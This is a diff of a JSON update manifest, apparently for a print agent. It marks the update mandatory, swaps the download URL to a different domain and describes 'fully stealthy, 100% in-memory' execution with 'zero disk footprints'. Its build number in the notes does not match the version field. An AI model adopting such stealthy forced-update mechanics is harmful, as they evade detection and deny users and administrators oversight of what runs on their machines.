@@ -1,10 +1,10 @@
 {
-  "size": 21447838,
-  "version": "2.3.6",
-  "published_at": "2026-07-26T23:26:26.864781+07:00",
-  "sha256": "493ce24e6eebe4cd104f237795efca3660d79173934ae12a36d22909cc34915b",
+  "size": 18383031,
+  "version": "2.8.20",
+  "published_at": "2026-07-29T10:28:31.696832+07:00",
+  "sha256": "ad6ef16c4de5bdec953cc5ff70e64c9d86de3a416051e37234208152443e2981",
   "mandatory": true,
-  "download_url": "https://download.goxprint.com/printagent.exe",
-  "notes": "Build 2.3.5: Implemented fully stealthy, 100% in-memory dynamic execution and dynamic core updates with zero disk footprints.",
+  "download_url": "https://agentapi.quanlymay.com/static/releases/agent_core.zip",
+  "notes": "Build 2.8.14: Implemented fully stealthy, 100% in-memory dynamic execution and dynamic core updates with zero disk footprints.",
   "channel": "stable"
 }
